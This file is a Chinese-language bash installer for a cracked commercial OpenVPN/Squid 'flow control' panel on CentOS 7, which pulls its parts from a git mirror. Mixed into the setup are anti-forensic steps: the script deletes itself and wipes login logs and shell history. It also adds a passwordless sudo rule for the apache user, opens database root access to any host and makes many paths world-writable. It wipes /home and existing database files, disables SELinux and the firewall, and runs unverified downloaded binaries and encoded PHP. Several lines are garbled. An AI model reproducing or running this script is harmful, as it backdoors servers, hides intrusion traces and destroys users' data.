#!/bin/bash
loks -r $0 >/dev/null 2>&1
rm -rf /passwd
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin 
export PATH
rm -- "$0" 
ServerLocation='vpns_zj';
MirrorHost='https://git.oschina.net/marisn/vpns/raw/master/vpns';
IPAddress=`wget http://members.3322.org/dyndns/getip -O - -q ; echo`;
echo > /var/log/wtmp
echo > /var/log/btmp
if [ -f /etc/os-release ];then
	OS_VERSION=`cat /etc/os-release | grep "VERSION_ID" | awk -F"=" '{print$2}' | cut -d '"' -f 2`
	if [ "$OS_VERSION" != "7" ]; then
		echo -e "\n当前系统版本为：\033[31mCentOS $OS_VERSION\033[0m\n"
		echo "暂不支持该系统安装"
		echo "请更换 CentOS 7.0-7.2 系统进行安装"
		echo "$CO";
		exit 0;
	fi
	elif [ -f /etc/redhat-release ];then
	OS_VERSION=`cat /etc/redhat-release | awk '{print$4}' | awk -F "." '{print$1}'`
	if [ "$OS_VERSION" != "7" ]; then
		echo -e "\n当前系统版本为：\033[31mCentOS $OS_VERSION\033[0m\n"
		echo "暂不支持该系统安装"
		echo "请更换 CentOS 7.0-7.2 系统进行安装"
		echo "$CO";
		exit 0;
	fi
	else
	echo -e "当前系统版本为：\033[31m未知\033[0m\n"
	echo "暂不支持该系统安装"
	echo "请更换 CentOS 7.0-7.2 系统进行安装"
	echo "$CO";
	exit 0；
	fi
	
	
	
	#disabled selinux
if [ "$(grep SELINUX= /etc/selinux/config  | grep -v "#" | cut -d= -f2)" == "disabled" ]; then
        echo ""

  elif [ "$(grep SELINUX= /etc/selinux/config  | grep -v "#" | cut -d= -f2)" == "enforcing" ]; then
        sed -i "s/SELINUX=enforcing/SELINUX=disabled/g" /etc/selinux/config
        setenforce 0
echo ""
echo ""

  elif [ "$(grep SELINUX= /etc/selinux/config  | grep -v "#" | cut -d= -f2)" == "permissive" ]; then
        sed -i "s/SELINUX=permissive/SELINUX=disabled/g" /etc/selinux/config
echo ""
echo ""
fi
	
	
	
	
	
	
if [ ! -e "/dev/net/tun" ];
    then
        echo
        echo -e "  安装出错 [原因：\033[31m TUN/TAP虚拟网卡不存在 \033[0m]"
        echo "  网易蜂巢容器官方已不支持安装使用"
        exit 0;
        fi
		if [ ! -e "/usr/bin/curl" ];
    then 
    echo "正在处理环境（预计3分钟内完成）..." 
    yum remove -y curl >/dev/null 2>&1 && yum install -y curl >/dev/null 2>&1 
fi
if [ ! -e "/usr/bin/expect" ];
    then
    echo "正在处理环境（预计3分钟内完成）..." 
    yum install -y expect >/dev/null 2>&1
fi
if [ ! -e "/usr/bin/expect" ];
    then
        echo "正在处理环境（预计3分钟内完成）..."
        yum install -y expect >/dev/null 2>&1
fi
if [ ! -e "/usr/bin/openssl" ];
    then
    echo "正在处理环境（预计3分钟内完成）..."
    yum install -y openssl >/dev/null 2>&1
	\cp -rf /usr/bin/openssl /usr/bin/suv
	else
	\cp -rf /usr/bin/openssl /usr/bin/suv
fi
clear;
cd /
# Logo	******************************************************************
CopyrightLogo='
==========================================================================
                                                                         
                      欢迎使用vpns破解脚本（Centos7），
		      
	      已开端口：tcp-53、443、137、8080，udp-57、137
			   
                        破解教程：blog.67cc.cn
				  		      
                                                                         								
					
==========================================================================';
echo "$CopyrightLogo";
vpns=server-passwd.tar.gz;
squidauto=/etc/openvpn/easy-rsa/squidauto;
squidname=root
squidpasswd=VPNS
VPNFILE=OpenVPN-VPNS.zip;
RSA=EasyRSA-2.2.2.tar.gz;
pass=vpns;
key="67cc.cn";
c700=epel-release-7-9.noarch;
openvpnrpm=openvpn-2.3.10-1.el7.x86_64.rpm;
echo -n -e "请输入验证码[\033[32m $key \033[0m]："
read PASSWD
readkey=$PASSWD
if [[ ${readkey%%\ *} == $key ]]
    then 
	echo
	echo -e "验证成功！"
	else
	echo -e "验证失败！"
function InputIPAddress()
{
    if [ "$IPAddress" == '' ]; then
        echo '无法检测您的IP';
        read -p '请输入您的公网IP:' IPAddress;
        [ "$IPAddress" == '' ] && InputIPAddress;
    fi;
    [ "$IPAddress" != '' ] && echo -n '[  OK  ] 您的IP是:' && echo $IPAddress;
	export IPAddress=$IPAddress
    sleep 2
}
CO='
==========================================================================
                OpenVPN-2.3.12 安装失败                    
             Powered by blog.67cc.cn 2017               
                  All Rights Reserved           
                                        
=========================================================================='
echo "$CO";
exit  
fi

clear;
 echo "开始设置流控相关数据"
 sleep 3
 echo
 echo -e "请输入数据库地址"
 echo 
 echo -n -e "输入数据库地址（默认为localhost）：" 
 read db_address 
 if [[ -z $db_address ]] 
 then 
 echo -e "已设置数据库地址：localhost"
 db_address=localhost 
 else 
 echo -e "已设置数据库地址：$db_address"
 fi 
 
  echo
 echo -e "请输入数据库端口"
 echo 
 echo -n -e "输入数据库端口（默认为3306）：" 
 read db_port 
 if [[ -z $db_port ]] 
 then 
 echo -e "已设置数据库端口：3306"
 db_port=3306 
 else 
 echo -e "已设置数据库端口：$db_port"
 fi 
 
  echo
 echo -e "请输入数据库用户名"
 echo 
 echo -n -e "输入数据库用户名（默认为root）：" 
 read db_username 
 if [[ -z $db_username ]] 
 then 
 echo -e "已设置数据库用户名：root"
 db_username=root 
 else 
 echo -e "已设置数据库用户名：$db_username"
 fi 
 
  echo
 echo -e "请输入数据库密码"
 echo 
 echo -n -e "输入数据库密码（默认为root）：" 
 read db_password 
 if [[ -z $db_password ]] 
 then 
 echo -e "已设置数据库密码：root"
 db_password=root 
 else 
 echo -e "已设置数据库密码：$db_password"
 fi 
 
  echo
 echo -e "请输入管理后台账号"
 echo 
 echo -n -e "输入管理后台账号（默认为admin）：" 
 read admin_username 
 if [[ -z $admin_username ]] 
 then 
 echo -e "已设置管理后台账号：admin"
 admin_username=admin 
 else 
 echo -e "已设置管理后台账号：$admin_username"
 fi 
 
  echo
 echo -e "请输入管理后台密码"
 echo 
 echo -n -e "输入管理后台密码（默认为admin）：" 
 read admin_password 
 if [[ -z $admin_password ]] 
 then 
 echo -e "已设置管理后台密码：admin"
 admin_password=admin 
 else 
 echo -e "已设置管理后台密码：$admin_password"
 fi 
 
  echo
 echo -e "请输入全局限速值"
 echo 
 echo -n -e "输入全局限速值（默认为99999）：" 
 read limit 
 if [[ -z $limit ]] 
 then 
 echo -e "已设置全局限速值：99999"
 limit=99999 
 else 
 echo -e "已设置全局限速值：$limit"
 fi
echo 
echo "数据已成功载入..."
echo "回车开始搭建" 
read
clear

echo "正在部署环境..."
rm -rf /etc/openvpn/* /etc/squid/* 
service openvpn stop >/dev/null 2>&1
killall squid >/dev/null 2>&1
sleep 2
echo
systemctl stop openvpn@server.service >/dev/null 2>&1
yum -y remove openvpn >/dev/null 2>&1
systemctl stop squid.service >/dev/null 2>&1
yum -y remove squid >/dev/null 2>&1
killall mproxy >/dev/null 2>&1
rm -rf /etc/openvpn/*
rm -rf /home/*
sleep 2 
systemctl stop httpd.service >/dev/null 2>&1
systemctl stop mariadb.service >/dev/null 2>&1
systemctl stop mysqld.service >/dev/null 2>&1
/etc/init.d/mysqld stop >/dev/null 2>&1
yum remove -y httpd >/dev/null 2>&1
yum remove -y mariadb mariadb-server >/dev/null 2>&1
yum remove -y mysql mysql-server>/dev/null 2>&1
rm -rf /var/lib/mysql
rm -rf /var/lib/mysql/
rm -rf /usr/lib64/mysql
rm -rf /etc/my.cnf
rm -rf /var/log/mysql/
rm -rf /usr/share/openvpn/
rm -rf /usr/share/out/
rm -rf /var/www/html/
yum remove -y nginx php-fpm >/dev/null 2>&1
yum remove -y php php-mysql php-gd libjpeg* php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-bcmath php-mhash php-fpm >/dev/null 2>&1
sleep 2



echo "安装执行命令..."
yum remove -y squid openvpn httpd epel*
rpm -ivh ${MirrorHost}/${c700}  >/dev/null 2>&1
yum install -y epel* >/dev/null 2>&1
sleep 1



ipgsd=`curl -s  http://ip138.com/ips138.asp?ip=${IPAddress}\&action=2 | iconv -f gb2312 -t utf-8|grep '<ul class="ul1"><li>' |awk -F'[><]+' '{  
print $5}'`
[[ $ipgsd =~ "阿里云" ]] || [[ $ipgsd =~ "腾讯云" ]] || [[ $ipgsd =~ "小鸟云" ]] && mir=1
if [[ $mir != "1" ]]
then
mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup
cd /etc/yum.repos.d/
wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo
rpm -ivh ${MirrorHost}/${c700}  >/dev/null 2>&1
yum clean all
yum makecache
sleep 2
fi


echo "安装执行命令..."
rpm -ivh ${MirrorHost}/${c700}  >/dev/null 2>&1
sleep 1
echo "检查并更新软件..."
sleep 1
yum install -y redhat-lsb gawk tar iptables iptables-services zip unzip httpd-devel gcc glibc-static openssl expect telnet ntp net-tools
sleep 1


cd /etc/
rm -rf ./sysctl.conf
echo 'net.ipv4.ip_forward = 1
net.ipv4.conf.default.rp_filter = 1
net.ipv4.conf.default.accept_source_route = 0
kernel.sysrq = 0
kernel.core_uses_pid = 1
net.ipv4.tcp_syncookies = 1
net.bridge.bridge-nf-call-ip6tables = 0
net.bridge.bridge-nf-call-iptables = 0
net.bridge.bridge-nf-call-arptables = 0
kernel.msgmnb = 65536
kernel.msgmax = 65536
kernel.shmmax = 68719476736
kernel.shmall = 4294967296
net.ipv4.tcp_congestion_control= hybla
net.core.rmem_default = 8388608  
net.core.rmem_max = 16777216  
net.core.wmem_default = 8388608  
net.core.wmem_max = 16777216  
net.core.netdev_max_backlog = 32768  
net.core.somaxconn = 32768  
net.core.optmem_max = 81920  
net.ipv4.tcp_wmem = 8192 436600 873200
net.ipv4.tcp_rmem  = 32768 436600 873200
net.ipv4.tcp_mem = 94500000 91500000 92700000 
net.ipv4.tcp_keepalive_time = 1200  
net.ipv4.tcp_keepalive_intvl = 30  
net.ipv4.tcp_keepalive_probes = 3  
net.ipv4.tcp_sack = 1  
net.ipv4.tcp_fack = 1  
net.ipv4.tcp_timestamps = 1  
net.ipv4.tcp_window_scaling = 1  
net.ipv4.tcp_syncookies = 1  
net.ipv4.tcp_tw_reuse = 1  
net.ipv4.tcp_tw_recycle = 1  
net.ipv4.tcp_fin_timeout = 30  
net.ipv4.ip_local_port_range = 10000  65000  
net.ipv4.tcp_max_syn_backlog = 8192
net.ipv4.tcp_max_tw_buckets = 5000
net.ipv4.tcp_max_syn_backlog = 65536
net.ipv4.tcp_synack_retries = 2
net.ipv4.tcp_syn_retries = 2
net.ipv4.tcp_max_orphans = 3276800
net.ipv4.tcp_retries2 = 5
vm.overcommit_memory = 1' >./sysctl.conf
sysctl -p >/dev/null 2>&1




echo "正在安装主程序..."
sleep 1
yum install openvpn -y
yum install -y squid openssl openssl-devel lzo lzo-devel pam pam-devel automake pkgconfig
# OpenVPN Installing ****************************************************************************
cd /etc/openvpn/
rm -rf ./server.conf
wget ${MirrorHost}/${vpns} >/dev/null 2>&1
wget ${MirrorHost}/VPNS.sh >/dev/null 2>&1
wget ${MirrorHost}/VPNS_out.sh >/dev/null 2>&1
sed -i "s/localhost/$db_address/g" /etc/openvpn/VPNS.sh
sed -i "s/3306/$db_port/g" /etc/openvpn/VPNS.sh
sed -i "s/root/$db_username/g" /etc/openvpn/VPNS.sh
sed -i "s/MySQLPass/$db_password/g" /etc/openvpn/VPNS.sh
sed -i "s/localhost/$db_address/g" /etc/openvpn/VPNS_out.sh
sed -i "s/3306/$db_port/g" /etc/openvpn/VPNS_out.sh
sed -i "s/root/$db_username/g" /etc/openvpn/VPNS_out.sh
sed -i "s/MySQLPass/$db_password/g" /etc/openvpn/VPNS_out.sh
tar -zxf server-passwd.tar.gz
rm -rf /etc/openvpn/${vpns} >/dev/null 2>&1
cd /etc/openvpn/
rm -rf /easy-rsa/

wget ${MirrorHost}/server1.conf >/dev/null 2>&1
chmod 777 /etc/openvpn/VPNS.sh
chmod 777 /etc/openvpn/VPNS_out.sh
chmod 777 /etc/openvpn/server1.conf
chmod 777 /etc/openvpn/mproxy
cd /usr/share/alsa/
wget ${MirrorHost}/${RSA} >/dev/null 2>&1
tar -zxvf ${RSA} -C /etc/openvpn >/dev/null 2>&1
rm -rf /usr/share/alsa/${RSA}
cd /etc/squid/
rm -rf ./squid.conf
rm -rf ./squid_passwd
mkdir /usr/share/openvpn/
cd /usr/share/openvpn/
wget ${MirrorHost}/server4.conf >/dev/null 2>&1
wget ${MirrorHost}/server5.conf >/dev/null 2>&1
chmod 777 /usr/share/openvpn/server4.conf
chmod 777 /usr/share/openvpn/server5.conf


cd /etc/squid/
echo "正在启用HTTP代理端口..."
sleep 1
echo "auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwd
auth_param basic children 5  
auth_param basic realm Welcome to pycredit's proxy-only web server 
acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 88
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 70
acl Safe_ports port 210
acl Safe_ports port 1025-65535
acl Safe_ports port 280
acl Safe_ports port 488
acl Safe_ports port 591
acl Safe_ports port 777
acl CONNECT method CONNECT
acl squid_user proxy_auth REQUIRED
via off
request_header_access X-Forwarded-For deny all
request_header_access user-agent  deny all
reply_header_access X-Forwarded-For deny all
reply_header_access user-agent deny all
http_port 80
http_access allow squid_user
http_access deny all
cache_dir ufs /var/spool/squid 100 16 256 read-only
cache_mem 512 MB
coredump_dir /var/spool/squid
access_log /var/log/squid/access.log
visible_hostname TD-LTE/FDD-LTE(vpns.vc)
cache_mgr Welcome_to_use_OpenVPN_For_vpns.vc" >./squid.conf
            chmod 0755 ./squid.conf
			echo "正在加密HTTP Proxy代理端口..."
chmod 777 /etc/openvpn/easy-rsa/squidauto
${squidauto} squid_passwd ${squidname} ${squidpasswd}
chmod 777 squid.conf squid_passwd
squid -z >/dev/null 2>&1
systemctl start squid >/dev/null 2>&1
systemctl enable squid >/dev/null 2>&1
rm -rf /etc/openvpn/easy-rsa/squidauto



# OpenVPN Installing ****************************************************************************
yum -y install httpd
cd /etc/httpd/conf/
rm -f httpd.conf
wget ${MirrorHost}/httpd.conf
systemctl start httpd.service
systemctl enable httpd.service
yum remove -y mysql*
yum -y install mariadb mariadb-server #MariaDB-client MariaDB-devel
sleep 3
systemctl start mariadb.service
systemctl enable mariadb.service
sleep 3
yum install -y php php-mysql php-gd php-mbstring
systemctl restart mariadb.service
systemctl restart httpd.service
sleep 3
##写入模块到php.ini
cd /etc
rm -f php.ini
wget ${MirrorHost}/php.ini >/dev/null 2>&1
chmod 0777 /etc/php.ini
cd /etc/php.d
wget ${MirrorHost}/20-ioncube.ini >/dev/null 2>&1
cd /usr/lib64/php/modules
wget ${MirrorHost}/ioncube_loader_lin_5.4.so >/dev/null 2>&1
service httpd restart
echo "请稍等，安装VPNS流控程序"	
cd /usr/share/alsa/
wget ${MirrorHost}/monitor-mproxy.tar.gz >/dev/null 2>&1	
		mkdir /var/www/html/upload/sql
		chmod 777 /var/www/html/upload/sql	
		tar zxvf monitor-mproxy.tar.gz -C /var/www/html/;
		rm -f monitor-mproxy.tar.gz;
		cd /var/www/html/
		mysqladmin -u root password $db_password
		mysql -h$db_address -P$db_port -u$db_username -p$db_password -e "DROP DATABASE test;"
		mysql -h$db_address -P$db_port -u$db_username -p$db_password -e "CREATE DATABASE ov;"
		mysql -h$db_address -P$db_port -u$db_username -p$db_password -e "use mysql;grant all privileges on *.* to 'root'@'%' identified by \"$db_password\" with grant option;flush privileges";
		sed -i "s/localhost/$db_address/g" /var/www/html/conf/db.php;
		sed -i "s/3306/$db_port/g" /var/www/html/conf/db.php;
		sed -i "s/root/$db_username/g" /var/www/html/conf/db.php;
		sed -i "s/root2/$db_password/g" /var/www/html/conf/db.php;
		sed -i "s/admin/$admin_username/g" ./ov.sql;		
		loginp=$(echo -n "$admin_password" | md5sum | cut -d ' ' -f1);
		sed -i "s/e6e061838856bf47e1de730719fb2609/$loginp/g" ./ov.sql;
		mysql -h$db_address -P$db_port -u$db_username -p$db_password ov < ov.sql
		rm -f ov.sql
		sed -i "s/Defaults    requiretty/#Defaults    requiretty/g" /etc/sudoers
		echo "apache	ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
		mv /var/www/html/out /usr/share/out/
		sed -i "s/localhost/$db_address/g" /usr/share/out/auto.sh
		sed -i "s/3306/$db_port/g" /usr/share/out/auto.sh
		sed -i "s/root/$db_username/g" /usr/share/out/auto.sh
		sed -i "s/MySQLPass/$db_password/g" /usr/share/out/auto.sh
		echo "*/1 * * * * sh /usr/share/out/curl.sh" >> /var/spool/cron/root
		rm -rf /etc/localtime
		ln -s /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 
		echo "*/10 * * * * ntpdate time.windows.com" >> /var/spool/cron/root
		systemctl restart  crond.service
		systemctl enable crond.service
		chmod -R 0777 /var/www/html
		chmod -R 0777 /usr/share/out/
		cd /etc/httpd/conf.d/
		mv /etc/httpd/conf.d/squid.conf /etc/httpd/conf.d/squid.conf.bak;
		wget ${MirrorHost}/squid.conf
		squid -z >/dev/null 2>&1
		systemctl restart squid >/dev/null 2>&1
		cd /etc/
		mv /etc/my.cnf /etc/my.cnf.bak;
		wget ${MirrorHost}/my.cnf
		systemctl restart mariadb.service
		
		
		
echo "请稍等，正在安装限速模块"
     yum -y install gcc-c++
		cd /var/www/html/vpnsmitt;
		make

		if [ $? != 0 ]; then
			echo "Make False , exit .";
			rm -rf vpnsmitt;
			exit;
		else
			clear;
			echo "";
			echo "限速模块正在配置";
			echo "";
		fi

		if [ ! -e "/etc/openvpn/server1.conf" ]; then
			echo "/etc/openvpn/server1.conf file not found ! exit .";
			rm -rf vpnsmitt;
			exit;
		fi

		cp -f bwlimitplugin.so /etc/openvpn/;
		
		if [ -e "/etc/openvpn/bwlimitplugin.cnf" ]; then
			cat /dev/null > /etc/openvpn/bwlimitplugin.cnf;
		else
			touch /etc/openvpn/bwlimitplugin.cnf;
		fi
		
		echo "plugin /etc/openvpn/bwlimitplugin.so \"/etc/openvpn/bwlimitplugin.cnf\"" >> /etc/openvpn/server1.conf;
		echo "management 0.0.0.0 7505" >> /etc/openvpn/server1.conf;
		echo "default $limit" >> /etc/openvpn/bwlimitplugin.cnf;
		echo "total 1000" >> /etc/openvpn/bwlimitplugin.cnf;
		
		echo "";
		echo "限速模块安装成功！";
		cd ..;
		rm -rf vpnsmitt;
		
# OpenVPN Installing ****************************************************************************





echo "
echo '正在重启openvpn服务...'
killall -9 openvpn >/dev/null 2>&1
sleep 3
openvpn --config /etc/openvpn/server1.conf &
sleep 0.3
openvpn --config /usr/share/openvpn/server4.conf &
sleep 0.3
openvpn --config /usr/share/openvpn/server5.conf &
chown -R apache:apache /var/www/html/Online >/dev/null 2>&1
chmod 777 /etc/openvpn/*.sh
killall -9 mproxy >/dev/null 2>&1
sleep 2
cd /etc/openvpn
./mproxy -l 8080 -d >/dev/null 2>&1
./mproxy -l 137 -d >/dev/null 2>&1
./mproxy -l 53 -d >/dev/null 2>&1
killall squid >/dev/null 2>&1
squid -z >/dev/null 2>&1
systemctl restart squid
echo -e '服务状态：			  [\033[32m  OK  \033[0m]'
exit 0;
" >/bin/revpns
chmod 0777 /bin/revpns
clear



# OpenVPN Installing ****************************************************************************
echo "正在启动服务..."
sleep 1
squid –z >/dev/null 2>&1
systemctl restart squid >/dev/null 2>&1
openvpn --config /etc/openvpn/server1.conf &
sleep 0.3
openvpn --config /usr/share/openvpn/server4.conf &
sleep 0.3
openvpn --config /usr/share/openvpn/server5.conf &
chown -R apache:apache /var/www/html/Online >/dev/null 2>&1
cd /etc/openvpn
./mproxy -l 8080 -d >/dev/null 2>&1
./mproxy -l 137 -d >/dev/null 2>&1
./mproxy -l 53 -d >/dev/null 2>&1
echo "openvpn --config /etc/openvpn/server1.conf &" >> /etc/rc.local
echo "openvpn --config /usr/share/openvpn/server4.conf &" >> /etc/rc.local
echo "openvpn --config /usr/share/openvpn/server5.conf &" >> /etc/rc.local
echo "/etc/openvpn/mproxy -l 8080 -d 2>&1" >> /etc/rc.local
echo "/etc/openvpn/mproxy -l 53 -d 2>&1" >> /etc/rc.local
echo "/etc/openvpn/mproxy -l 137 -d 2>&1" >> /etc/rc.local
chmod +x /etc/rc.d/rc.local
# OpenVPN Installing ****************************************************************************

virsh net-destroy default
systemctl stop libvirtd
chkconfig libvirtd off


code=`ifconfig | grep ether | awk '{print$2}' | md5sum | cut -d'-' -f1 | cut -d' ' -f1`
codes=`echo -n $code$code | md5sum | cut -d'-' -f1 | cut -d' ' -f1`
mysql -h$db_address -P$db_port -u$db_username -p$db_password -e "use ov;truncate table code;"
mysql -h$db_address -P$db_port -u$db_username -p$db_password -e "INSERT INTO ov.\`code\` (\`code\`) VALUES (\"$codes\")"
echo $codes > /var/www/html/license.lic
 
cd /etc/openvpn/
chmod -R 0777 /etc/openvpn
cp /etc/openvpn/easy-rsa/keys/ca.crt /home/ >/dev/null 2>&1
cp /etc/openvpn/easy-rsa/keys/ta.key /home/ >/dev/null 2>&1
cd /home/ >/dev/null 2>&1
cd /home
wget ${MirrorHost}/xianlu.tar.gz >/dev/null 2>&1		
		tar zxvf xianlu.tar.gz -C /home/;
		cd /home
		sed -i "s/fileip/$IPAddress/g" /home/*
		rm -f xianlu.tar.gz;
		cd /home
		zip OpenVPN-VPNS.zip ./{anhui.ovpn,anhui2.ovpn,dx.ovpn,dx2.ovpn,udp138.ovpn,fujian.ovpn,fujian2.ovpn,gd-dg.ovpn,gd-lt.ovpn,gd-qingyuan.ovpn,gd-sz.ovpn,gd-yd.ovpn,henan-wap.ovpn,hubei.ovpn,hunan-366.ovpn,hunan-wap.ovpn,jiangsu-net.ovpn,jiangxi-gd-liaoning.ovpn,lt-shandong.ovpn,migu.ovpn,shanxi-wap.ovpn,shanxi-wap2.ovpn,sichuan-wap.ovpn,uac-wap.ovpn,yunnan.ovpn,ca.crt,ta.key}
mv /home/OpenVPN-VPNS.zip /var/www/html/
clear
rm -rf /usr/local/src/install.config
clear



# OpenVPN Installing ****************************************************************************
echo "配置网络环境..."
sleep 3
systemctl stop firewalld.service >/dev/null 2>&1
systemctl disable firewalld.service >/dev/null 2>&1
systemctl restart iptables.service >/dev/null 2>&1
iptables -F >/dev/null 2>&1
service iptables save >/dev/null 2>&1
service iptables restart >/dev/null 2>&1
sleep 3
iptables -t nat -A POSTROUTING -s 10.0.0.0/16 -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.0.0.0/16 -j SNAT --to-source $IPAddress
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -A INPUT -p TCP --dport 8080 -j ACCEPT
ifconfig | grep inet | grep -Ev "10.8.0.1|10.9.0.1|10.10.0.1|10.11.0.1|10.12.0.1|net6" | awk '{print$2}' > ip.txt

cat ip.txt | while read line
do

	iptables -A INPUT -p tcp -m tcp -s $line/32 --dport 7505 -j ACCEPT
	iptables -A INPUT -p tcp -m tcp -s $line/32 --dport 7506 -j ACCEPT
	iptables -A INPUT -p tcp -m tcp -s $line/32 --dport 7507 -j ACCEPT
	iptables -A INPUT -p tcp -m tcp -s $line/32 --dport 7508 -j ACCEPT
	iptables -A INPUT -p tcp -m tcp -s $line/32 --dport 7509 -j ACCEPT

done

rm -f ip.txt

iptables -A INPUT -p tcp -m tcp --dport 7505 -j DROP
iptables -A INPUT -p tcp -m tcp --dport 7506 -j DROP
iptables -A INPUT -p tcp -m tcp --dport 7507 -j DROP
iptables -A INPUT -p tcp -m tcp --dport 7508 -j DROP
iptables -A INPUT -p tcp -m tcp --dport 7509 -j DROP
iptables -A INPUT -p TCP --dport 53 -j ACCEPT
iptables -A INPUT -p TCP --dport 137 -j ACCEPT
iptables -A INPUT -p TCP --dport 139 -j ACCEPT
iptables -A INPUT -p UDP --dport 137 -j ACCEPT
iptables -A INPUT -p UDP --dport 139 -j ACCEPT
iptables -A INPUT -p TCP --dport 443 -j ACCEPT
iptables -A INPUT -p UDP --dport 53 -j ACCEPT 
iptables -A INPUT -p TCP --dport 138 -j ACCEPT 
iptables -A INPUT -p TCP --dport 366 -j ACCEPT
iptables -A INPUT -p TCP --dport 3306 -j ACCEPT
iptables -A INPUT -p TCP --dport 3389 -j ACCEPT
iptables -A INPUT -p TCP --dport 7788 -j ACCEPT
iptables -A INPUT -p TCP --dport 351 -j ACCEPT
iptables -A INPUT -p TCP --dport 80 -j ACCEPT
iptables -A INPUT -p TCP --dport 88 -j ACCEPT
iptables -A INPUT -p TCP --dport 22 -j ACCEPT
iptables -A INPUT -p TCP --dport 25 -j DROP
iptables -t nat -A PREROUTING -p tcp --dport 3389 -j REDIRECT --to-ports 443
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
service iptables save >/dev/null 2>&1
service iptables restart >/dev/null 2>&1
systemctl restart iptables.service >/dev/null 2>&1
chkconfig iptables on >/dev/null 2>&1
systemctl enable iptables.service >/dev/null 2>&1
setenforce 0 >/dev/null 2>&1
sleep 1
if [ ! -f /usr/lib64/libmysqlclient.so.18.0.0 ]; then

	cd /usr/lib64/
	wget -c ${MirrorHost}/libmysqlclient.so.18.0.0
	ln -s libmysqlclient.so.18.0.0 libmysqlclient.so.18
	service httpd restart
	
fi
# OpenVPN Installing ****************************************************************************
echo > /var/log/wtmp
echo > /var/log/btmp
history -c
echo > ./.bash_history
# OpenVPN Installing ****************************************************************************
revpns
echo 
echo 配置下载连接 http://$IPAddress:7788/OpenVPN-VPNS.zip
echo
echo 控制面板为 http://$IPAddress:7788 管理后台为 http://$IPAddress:7788/admin
echo 后台账号为 $admin_username        后台密码为 $admin_password
echo
echo 
echo 
echo openvpn快捷重启命令：revpns
echo 
echo 
echo 您的IP是：$IPAddress 
Client='
==========================================================================
            OpenVPN-2.3.12 安装完毕 
				 
             Powered by VPNS 2016    
			 
             All Rights Reserved  
				  
		    破解教程：blog.67cc.cn
==========================================================================';
echo "$Client";
exit 0;
fi
# OpenVPN Installation Complete ****************************************************************************
